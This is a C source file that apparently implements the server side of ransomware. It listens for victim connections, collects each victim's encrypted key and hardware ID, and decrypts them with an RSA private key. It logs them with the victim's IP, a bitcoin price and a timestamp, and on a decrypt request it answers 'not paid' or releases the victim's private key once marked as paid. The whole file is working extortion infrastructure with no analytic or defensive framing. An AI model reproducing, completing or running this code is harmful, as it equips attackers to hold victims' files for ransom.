#include "sock.h"
#include "crypt.h"

DWORD WINAPI init_sock(void* _arg[3]) {
	int res;
	int client_len;
	WSADATA* wsa;
	int* port_number;

	wsa = (WSADATA*)_arg[0];
	port_number = (int*)_arg[1];

	pclient_socket socket_head = (pclient_socket)_arg[3];
	SOCKET sock = INVALID_SOCKET;
	char* recvbuff = malloc(recvbuff_len * sizeof(char));
	char* sendbuff = malloc(recvbuff_len * sizeof(char));
	void* arg[1];

	res = WSAStartup(MAKEWORD(2, 2), wsa);
	if (res != 0) {
		printf("WSAStartup failed with code: %d.\n", res);
		return false;
	}

	struct sockaddr_in server;
	struct sockaddr_in client = { 0 };

	client_len = sizeof(struct sockaddr_in);

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET) {
		printf("listensock failed with code: %ld\n", WSAGetLastError());
		return false;
	}

	server.sin_family = AF_INET;
	server.sin_addr.S_un.S_addr = INADDR_ANY;
	server.sin_port = htons(*port_number);

	res = bind(sock, (struct sockaddr*) & server, sizeof(server));
	if (res == SOCKET_ERROR) {
		printf("bind failed with code: %d\n", WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return false;
	}
	while (true) {
		res = listen(sock, SOMAXCONN);
		if (res == SOCKET_ERROR) {
			printf("listen failed with code: %d\n", WSAGetLastError());
			closesocket(sock);
			WSACleanup();
			return false;
		}
		if (res == 0 && terminate_flag == 1) {
			free(sendbuff);
			free(recvbuff);
			closesocket(sock);
			WSACleanup();
			return true;
		}


		pclient_socket tmp = (pclient_socket)malloc(sizeof(client_socket));
		if (tmp == NULL) {
			puts("client struct allocation failed. NOT GOOD\n");
			continue;
		}
		tmp->client_sock = accept(sock, (struct sockaddr*) & client, &client_len);
		if (tmp->client_sock == INVALID_SOCKET) {
			free(tmp);
			continue;
		}
		memcpy(tmp->ip, inet_ntoa(client.sin_addr), 16);

		if (tmp->client_sock == INVALID_SOCKET) {
			printf("accept failed with code: %d\n", WSAGetLastError());
			closesocket(sock);
			WSACleanup();
			return false;
		}
		tmp->thread_number += 1;
		arg[0] = tmp;
		_beginthread(listen_sock, NULL, arg);
	}
	return false; //it should never reach here
}

bool listen_sock(void* arg[1]) {
	int res;
	char bit_price[10];
	char recvbuff[recvbuff_len];
	pclient_socket client_sock = (pclient_socket)arg[0];
	SOCKET sock = client_sock->client_sock;
	NCRYPT_KEY_HANDLE key = 0;
	NCRYPT_PROV_HANDLE handle = 0;
	HANDLE file = 0;
	PBYTE pri_key = NULL;

	LPVOID client_key = NULL, tmp = NULL, machine_key = NULL, size = NULL, send_key_back = NULL, read_file = NULL, search_str = NULL;
	DWORD client_key_size = 0, tmp_size = 0, key_div = 0, decrypt_size = 0, machine_key_size = 0, send_key_back_size = 0, file_size = 0;

	LPVOID temp = HeapAlloc(GetProcessHeap(), 0, 128);

	size = HeapAlloc(GetProcessHeap(), 0, sizeof(DWORD));
	if (temp == NULL) {
		printf("temp memory allocation failed.\n");
		return false;
	}

	file = CreateFileA("key.txt", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		printf("failed to open key.txt %lu\n", GetLastError());
		return false;
	}

	file_size = GetFileSize(file, NULL);
	pri_key = (PBYTE)HeapAlloc(GetProcessHeap(), 0, file_size);
	if (pri_key == NULL) {
		printf("failed to allocate pri_key size: %lu - %lu\n", file_size, GetLastError());
		return false;
	}
	if (!ReadFile(file, pri_key, file_size, &file_size, NULL)) {
		printf("failed to read key.txt %lu\n", GetLastError());
		return false;
	}
	CloseHandle(file);
	if (import_key(&handle, &key, file_size, pri_key, BCRYPT_RSAFULLPRIVATE_BLOB) == false) {
		printf("importing key failed.\n");
		return false;
	}
	while (true) {
	start:
		memset(recvbuff, 0, recvbuff_len);
		res = recv(sock, recvbuff, recvbuff_len, 0);
		if (res > 0) {
			if (memcmp(recvbuff, CLIENT_KEY_DEF, strlen(CLIENT_KEY_DEF)) == 0) {
				if (tmp) {
					client_key_size = res - strlen(CLIENT_KEY_DEF) + tmp_size;
					client_key = HeapAlloc(GetProcessHeap(), 0, client_key_size);
					if (client_key == NULL) {
						printf("client_key memory allocation failed.\n");
						continue;
					}
					memcpy(client_key, tmp, tmp_size);
					memcpy((LPVOID)((DWORD)client_key + tmp_size), (LPVOID)((DWORD)recvbuff + strlen(CLIENT_KEY_DEF)), res - strlen(CLIENT_KEY_DEF));

					HeapFree(GetProcessHeap(), 0, tmp);
					tmp_size = client_key_size;
					tmp = HeapAlloc(GetProcessHeap(), 0, tmp_size);
					if (tmp == NULL) {
						printf("tmp memory allocation failed.\n");
						continue;
					}
					memcpy(tmp, client_key, tmp_size);
					HeapFree(GetProcessHeap(), 0, client_key);
					client_key = NULL;
					++key_div;
				}
				else {
					tmp_size = res - strlen(CLIENT_KEY_DEF);
					tmp = HeapAlloc(GetProcessHeap(), 0, tmp_size);
					if (tmp == NULL) {
						printf("tmp memory allocation failed.\n");
						continue;
					}
					memcpy(tmp, (LPVOID)((DWORD)recvbuff + strlen(CLIENT_KEY_DEF)), tmp_size);
					++key_div;
				}
			}
			else if (memcmp(recvbuff, HARDWARE_ID_DEF, strlen(HARDWARE_ID_DEF)) == 0) {
				machine_key_size = res - strlen(HARDWARE_ID_DEF);
				machine_key = HeapAlloc(GetProcessHeap(), 0, machine_key_size);
				if (machine_key == NULL) {
					printf("machine_key heap allocation failed.\n");
					continue;
				}
				memcpy(machine_key, (LPVOID)((DWORD)recvbuff + strlen(HARDWARE_ID_DEF)), machine_key_size);
			}
			else if (memcmp(recvbuff, "done", 4) == 0) {
				SYSTEMTIME system_time;
				file = CreateFileA("key", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
				if (file == INVALID_HANDLE_VALUE) {
					printf("failed to open file key.\n");
					closesocket(sock);
					return false;
				}
				if (client_key) HeapFree(GetProcessHeap(), 0, client_key);
				client_key_size = 0;
				int do_more = 0;
				client_key = HeapAlloc(GetProcessHeap(), 0, (++key_div) * 100);
				if (client_key == NULL) {
					printf("temp memory allocation failed.\n");
					continue;
				}
				decrypt_size = tmp_size;
				tmp_size = 0;

				while (1) {
					tmp_size = 0;
					if (decrypt_size > 128) {
						memcpy(temp, (LPVOID)((DWORD)tmp + do_more * 128), 128);
						if (decrypt_buff(&key, 128, temp, &tmp_size, NULL) == false) printf("decrypt_buff1 failed.\n");
						if (decrypt_buff(&key, 128, temp, &tmp_size, (LPVOID)((DWORD)client_key + client_key_size)) == false) printf("decrypt_buff2 failed.\n");
						client_key_size += tmp_size;
						decrypt_size -= 128;
					}
					else {
						memset(temp, 0, 128);
						memcpy(temp, (LPVOID)((DWORD)tmp + do_more * 128), decrypt_size);
						if (decrypt_buff(&key, decrypt_size, temp, &tmp_size, NULL) == false) printf("decrypt_buff3 failed.\n");
						if (decrypt_buff(&key, decrypt_size, temp, &tmp_size, (LPVOID)((DWORD)client_key + client_key_size)) == false)printf("decrypt_buff4 failed.\n");
						client_key_size += tmp_size;
						break;
					}
					++do_more;
				}
				if (decrypt_buff(&key, machine_key_size, machine_key, &machine_key_size, machine_key) == false) printf("decrypt machine_key failed.\n");

				int pos = 0;
				file_size = GetFileSize(file, NULL);
				if (file_size != 0) {
					read_file = HeapAlloc(GetProcessHeap(), 0, file_size);
					if (read_file == NULL) {
						puts("read_file allocation failed\n");
						closesocket(sock);
						return false;
					}
					if (!ReadFile(file, read_file, file_size, &file_size, 0)) {
						puts("ReadFile failed\n");
						closesocket(sock);
						return false;
					}
					for (int i = 0; i < file_size; ++i) {
						if (((PBYTE)read_file)[i] == ((PBYTE)machine_key)[0]) {
							if (memcmp(&((PBYTE)read_file)[i], machine_key, machine_key_size) == 0) {
								pos = i;
								break;
							}
						}
					}
				}

				if (pos != NULL) SetFilePointer(file, pos - sizeof(DWORD) - 1 - 12, NULL, NULL);

				if (get_bit_price(bit_price) == 0) {
					puts("get_bit_price failed\n");
				}
				char system_time_[9];

				GetSystemTime(&system_time);

				if (system_time.wMonth < 10) {
					system_time_[0] = '0';
					_itoa(system_time.wMonth, &system_time_[1], 10);
				}
				else _itoa(system_time.wMonth, system_time_, 10);

				if (system_time.wDay < 10) {
					system_time_[2] = '0';
					_itoa(system_time.wDay, &system_time_[3], 10);
				}
				else _itoa(system_time.wDay, &system_time_[2], 10);

				if (system_time.wHour < 10) {
					system_time_[4] = '0';
					_itoa(system_time.wHour, &system_time_[5], 10);
				}
				else _itoa(system_time.wHour, &system_time_[4], 10);

				if (system_time.wMinute < 10) {
					system_time_[6] = '0';
					_itoa(system_time.wMinute, &system_time_[7], 10);
				}
				else _itoa(system_time.wMinute, &system_time_[6], 10);

				if (WriteFile(file, "+machine_key", 12, &res, NULL) == false) {
					printf("failed to write to file.\n");
				}
				memset(size, 0, sizeof(DWORD));
				if (WriteFile(file, _itoa(machine_key_size, size, 10), sizeof(DWORD), &res, NULL) == false) {
					printf("failed to write to file.\n");
				}
				if (WriteFile(file, ":", 1, &res, NULL) == false) {
					printf("failed to write to file.\n");
				}
				if (WriteFile(file, machine_key, machine_key_size, &res, NULL) == false) {
					printf("failed to write to file.\n");
				}
				if (WriteFile(file, "\r\nprivate_key", 13, &res, NULL) == false) {
					printf("failed to write to file.\n");
				}
				memset(size, 0, sizeof(DWORD));
				if (WriteFile(file, _itoa(client_key_size, size, 10), sizeof(DWORD), &res, NULL) == false) {
					printf("failed to write to file.\n");
				}
				if (WriteFile(file, ":", 1, &res, NULL) == false) {
					printf("failed to write to file.\n");
				}
				if (WriteFile(file, client_key, client_key_size, &res, NULL) == false) {
					printf("failed to write to file.\n");
				}
				if (WriteFile(file, "\r\nip: ", 5, &res, NULL) == false) {
					printf("failed to write to file.\n");
				}
				if (WriteFile(file, client_sock->ip, strlen(client_sock->ip), &res, NULL) == false) {
					printf("failed to write to file.\n");
				}
				if (WriteFile(file, "\r\nbit price: ", 13, &res, NULL) == false) {
					printf("failed to write to file.\n");
				}
				if (WriteFile(file, bit_price, strlen(bit_price), &res, NULL) == false) {
					printf("failed to write to file.\n");
				}
				if (WriteFile(file, "\r\ntime: ", 8, &res, NULL) == false) {
					printf("failed to write to file.\n");
				}
				if (WriteFile(file, system_time_, 8, &res, NULL) == false) {
					printf("failed to write to file.\n");
				}
				if (WriteFile(file, "\r\n--------------\r\n", 18, &res, NULL) == false) {
					printf("failed to write to file.\n");
				}
				HeapFree(GetProcessHeap(), 0, read_file);
				HeapFree(GetProcessHeap(), 0, tmp);
				HeapFree(GetProcessHeap(), 0, client_key);
				HeapFree(GetProcessHeap(), 0, machine_key);
				CloseHandle(file);
			}
			else if (memcmp(recvbuff, "decrypt request", 15) == 0) {
				file = CreateFileA("key", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
				if (file == INVALID_HANDLE_VALUE) {
					printf("failed to open file key.\n");
					closesocket(sock);
					return false;
				}
				file_size = GetFileSize(file, NULL);
				read_file = HeapAlloc(GetProcessHeap(), 0, file_size);
				if (read_file == NULL) {
					printf("send_key_back failed.\n");
					closesocket(sock);
					return false;
				}
				if (ReadFile(file, read_file, file_size, &file_size, NULL) == false) {
					printf("readfile failed.\n");
					closesocket(sock);
					return false;
				}
				search_str = HeapAlloc(GetProcessHeap(), 0, res - 15);
				if (search_str == NULL) {
					printf("search_str failed to allocate res %d.\n", res);
					continue;
				}
				memcpy(search_str, (LPVOID)((DWORD)recvbuff + 15), res - 15);
				int i;
				for (i = 0; i < file_size; ++i) {
					if (((PBYTE)search_str)[0] == ((PBYTE)read_file)[i]) {
						if ((i + res - 15) > file_size) {
							printf("exceded file_size.\n");
							break;
						}
						if (memcmp(search_str, &(((PBYTE)read_file)[i]), res - 15) == 0) {
							DWORD a = (&(((PBYTE)read_file)[i]) - 1 - sizeof(DWORD) - 11 - 1);
							if (memcmp(&(((PBYTE)read_file)[i]) - 1 - sizeof(DWORD) - 11 - 1, "+", 1) == 0) {
								if (send(sock, "not paid", 8, 0) == SOCKET_ERROR) {
									printf("failed to send not paid %d\n", WSAGetLastError());
									HeapFree(GetProcessHeap(), 0, read_file);
									HeapFree(GetProcessHeap(), 0, search_str);
									CloseHandle(file);
									goto start;
								}
								HeapFree(GetProcessHeap(), 0, read_file);
								HeapFree(GetProcessHeap(), 0, search_str);
								CloseHandle(file);
								goto start;
							}
							else if (memcmp(&(((PBYTE)read_file)[i]) - 1 - sizeof(DWORD) - 11 - 1, "*", 1) == 0) break;
						}
					}
				}
				if (i == file_size) {
					printf("couldn't find the machine_key.\n");
					continue;
				}
				memset(size, 0, sizeof(DWORD));
				memcpy(size, &(((PBYTE)read_file)[i]) - 1 - sizeof(DWORD), sizeof(DWORD));
				send_key_back_size = atoi(size);
				memcpy(size, &(((PBYTE)read_file)[i]) + atoi(size) + strlen("private_key") + 2, sizeof(DWORD));
				send_key_back = HeapAlloc(GetProcessHeap(), 0, atoi(size));
				if (send_key_back == NULL) {
					printf("send_key_back allocation failed.\n");
					continue;
				}
				memcpy(send_key_back, &(((PBYTE)read_file)[i]) + send_key_back_size + strlen("private_key") + sizeof(DWORD) + 3, atoi(size));
				send_key_back_size = atoi(size);
				res = send(sock, send_key_back, send_key_back_size, 0);
				if (res == SOCKET_ERROR) {
					printf("send failed with error: %d\n", WSAGetLastError());
					closesocket(sock);
					return false;
				}
				HeapFree(GetProcessHeap(), 0, read_file);
				HeapFree(GetProcessHeap(), 0, send_key_back);
				HeapFree(GetProcessHeap(), 0, search_str);
				CloseHandle(file);
			}
			else if (memcmp(recvbuff, "1", 1) == 0) {
				if (send(sock, "1", 1, 0) == SOCKET_ERROR) {
					printf("failed to send keep_alive %d.\n", WSAGetLastError());
				}
			}
			else if (memcmp(recvbuff, INIT_DEF, strlen(INIT_DEF)) == 0) {
				machine_key = HeapAlloc(GetProcessHeap(), 0, res - strlen(INIT_DEF) + 1);
				memcpy(machine_key, (LPVOID)((DWORD)recvbuff + strlen(INIT_DEF)), res - strlen(INIT_DEF));

				file = CreateFileA("key", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
				if (file == ERROR_INVALID_HANDLE) {
					printf("failed to open file in INIT_DEF %lu\n", GetLastError());
					continue;
				}
				file_size = GetFileSize(file, NULL);
				read_file = HeapAlloc(GetProcessHeap(), 0, file_size);
				if (!ReadFile(file, read_file, file_size, &file_size, NULL)) {
					printf("ReadFile failed in INIT_DEF %lu\n", GetLastError());
					continue;
				}
				CloseHandle(file);
				for (int i = 0; i < file_size; ++i) {
					if (((PBYTE)machine_key)[0] == ((PBYTE)read_file)[i]) {
						if (memcmp(&((PBYTE)machine_key)[0], &((PBYTE)read_file)[i], res - strlen(INIT_DEF)) == 0) {
							for (int j = i; j < file_size; ++j) {
								if (((PBYTE)read_file)[j] == 'b') {
									if (memcmp(&((PBYTE)read_file)[j], "bit price", 9) == 0) {
										tmp = HeapAlloc(GetProcessHeap(), 0, strlen(INIT_DEF) + 10 + 8);
										memcpy(tmp, INIT_DEF, strlen(INIT_DEF));
										memcpy((LPVOID)((DWORD)tmp + strlen(INIT_DEF)), &((PBYTE)read_file)[j + 28], 8);
										memcpy((LPVOID)((DWORD)tmp + strlen(INIT_DEF) + 8), &((PBYTE)read_file)[j + 11], 10);
										if (send(sock, tmp, strlen(INIT_DEF) + 8 + 10, 0) == SOCKET_ERROR) {
											printf("failed to send time %d\n", WSAGetLastError());
											goto end;
										}
										HeapFree(GetProcessHeap(), 0, tmp);
										break;
									}
								}
							}
							break;
						}
					}
				}
				HeapFree(GetProcessHeap(), 0, read_file);
				HeapFree(GetProcessHeap(), 0, machine_key);
			}
		}
		else break;
	}
end:
	HeapFree(GetProcessHeap(), 0, temp);
	HeapFree(GetProcessHeap(), 0, size);
	closesocket(sock);
	return true;
}